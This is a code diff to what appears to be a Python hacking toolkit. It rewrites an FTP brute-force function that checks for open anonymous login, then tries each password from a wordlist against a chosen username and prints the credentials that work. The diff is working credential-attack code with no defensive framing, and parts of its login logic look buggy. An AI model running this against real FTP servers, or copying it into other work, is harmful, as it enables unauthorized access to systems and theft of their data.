@@ -24,6 +24,7 @@ import platform
 import dns.zone
 import os.path
 import zipfile
+import ftplib
 import shutil
 import socket
 import shodan
@@ -567,59 +568,40 @@ def dns_ex():
 
 def ftp_brute():
 	target = input('Enter IP or domain: ')
-	username = input('Enter USERNAME wordlist: ')
-	password = input('Enter PASSWORD wordlist: ')
+	user = input('Enter USERNAME: ')
+	passwordW = input('Enter PASSWORD wordlist: ')
 
 	ftp = FTP(target)
 	print()
-	answers = {'230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}
+	answers = {"230 'anonymous@' login ok.", '230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}
 
 	try:
-		if ftp.login() in answers:
-			print(good('Anonymous login is open.'))
-			print(good('Username: anonymous'))
-			print(good('Password: anonymous@'))
-			ftp.close()
-		else:
-			ftp.close()
+		if ftp.login() in answers or ftp.login() == '230' or ftp.login().startswith('230'):
+			print(bold(good('Anonymous login is open.')))
+			print(bold(good('Username: anonymous')))
+			print(bold(good('Password: anonymous@')))
+			print()
 	except:
-		ftp.close()
 		pass
+	ftp.close()
 
-	try:
-		usernames = open(username)
-		passwords = open(password)
+	passwords = open(passwordW, 'r')
 
-		answers = {'230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}
-		for user in usernames.readlines():
-			for passw in passwords.readlines():
-				user = user.strip()
-				passw = passw.strip()
-				ftp = FTP(target)
+	ftp = FTP(target)
 
-				try:
-					if ftp.login(user, passw) in answers:
-						print()
-						print(good('Success.'))
-						print(good('Username: ' + user))
-						print(good('Password: ' + passw))
-						ftp.close()
-						#break
-					else:
-						print()
-						print(bad('Failed.'))
-						print(bad('Username failed: ' + user))
-						print(bad('Password failed: ' + passw))
-						ftp.close()
-				except Exception as e:
-					print()
-					print(bad('Failed: {}'.format(e)))
-					print(bad('Username failed: ' + user))
-					print(bad('Password failed: ' + passw))
-					ftp.close()
-	except Exception as e:
-		print(bad('Bruteforce failed: ' + e))
-		ftp.quit()
+	for password in passwords:
+		try:
+			if ftp.login(user, password.strip()):
+				print(bold(good('Success.')))
+				print(bold(good('Username: ' + user)))
+				print(bold(good('Password: ' + password)))
+		except ftplib.error_perm:
+				print(bold(bad('Failed.')))
+				print(bold(bad('Username failed: ' + user)))
+				print(bold(bad('Password failed: ' + password)))
+		except Exception:
+			pass
+	ftp.close()
 
 def mapper():
 	if 'Windows' in platform.system() or 'Darwin' in platform.system():
